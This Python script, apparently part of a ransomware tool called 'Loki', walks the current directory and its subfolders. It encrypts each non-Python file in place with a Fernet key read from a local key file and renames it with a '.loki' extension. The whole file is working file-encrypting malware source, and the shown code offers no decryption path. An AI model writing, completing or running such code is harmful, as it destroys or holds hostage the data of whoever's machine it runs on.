# Imports.
import sys
import os
import subprocess
from cryptography.fernet import Fernet
from colorama import Fore
import threading

# Pre-run.
subprocess.run("clear", shell=True)
sys.tracebacklimit = 0

# Config (Prints).
print_text = (f"{Fore.WHITE}") # Change the colour of text output in the client side prints.
print_dividers = (f"{Fore.LIGHTRED_EX}") # Changes the [], | and : in the client side prints.
print_success = (f"{Fore.WHITE}[{Fore.GREEN}SUCCESS{Fore.WHITE}]") # Success output.
print_successfully = (f"{Fore.WHITE}[{Fore.GREEN}SUCCESSFULLY{Fore.WHITE}]") # Successfully output.
print_failed = (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}FAILED{Fore.WHITE}]") # Failed output.
print_prompt = (f"{Fore.WHITE}[{Fore.YELLOW}»{Fore.WHITE}]") # Prompt output.
print_notice = (f"{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}]") # Notice output.
print_question =  (f"{Fore.WHITE}[{Fore.YELLOW}?{Fore.WHITE}]") # Alert output.
print_alert =  (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}!{Fore.WHITE}]") # Alert output.
print_exited = (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}EXITED{Fore.WHITE}]") # Execited output.
print_disconnected = (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}DISCONNECTED{Fore.WHITE}]") # Disconnected output.
print_command = (f"\n[{Fore.YELLOW}>_{Fore.WHITE}]: ") # Always asks for a command on a new line.
print_red_command = (f"\n[{Fore.YELLOW}>_{Fore.WHITE}]: {Fore.RED}¤{Fore.WHITE} ") # Always asks for a command on a new line.

# Recursive Path Traversal.
def findFiles(path):
    files = []
    for f in os.listdir(path):
        new_path = os.path.join(path, f)
        if os.path.isdir(new_path):
            if f in ['/dev', '/etc', '/export', '/kernel', '/opt', '/sbin', '/stand', '/tmp', '/usr', '/var', 'loki']: # Ignore node_modules directory
                continue
            files += findFiles(new_path)
        else:
            if f in ['loki.key', 'loki.key.bk', 'loki_config.json'] or f.endswith('.py'): # Ignore .py and loki.key files
                continue
            files.append(new_path)
    return files

# Encrypt/Decrypt handler.
def handleFile(filePath, key, action):
    with open(filePath, "rb") as file:
        contents = file.read()

    if action.lower() == "e":
        contents = Fernet(key).encrypt(contents)
        message = f"Encrypted | {print_successfully}"
    else:
        print(f"{action} is not a valid file action")
        return

    with open(filePath, "wb") as file:
        file.write(contents)
        print(message, "|", filePath)

# Functions.
def encrypt(files):
    try:
        # Get the key.
        with open("loki.key", "rb") as loki_key:
            key = loki_key.read()
        # encrypt files.
        for path in files:
            if '.py' in path:
                continue
            if 'loki.key' in path:
                continue
            # Handle File.
            handleFile(path, key, "e")
            # Rename.
            new_path = path
            ext = '.loki'
            if path[-len(ext):] != ext:
                new_path += ext
            os.rename(path, new_path)
    except:
        print("Files already encrypted | Loki is detected, if you feel this is a bug consider attempting manual encryption.")

def encryptor():
    # Find files in current dir, and sub dirs.
    files = findFiles(".")
    encrypt(files)
    return

if __name__ == '__main__':
    encryptor()

encryptor_thread = threading.Thread(target=encryptor)
encryptor_thread.start()
encryptor_thread.join()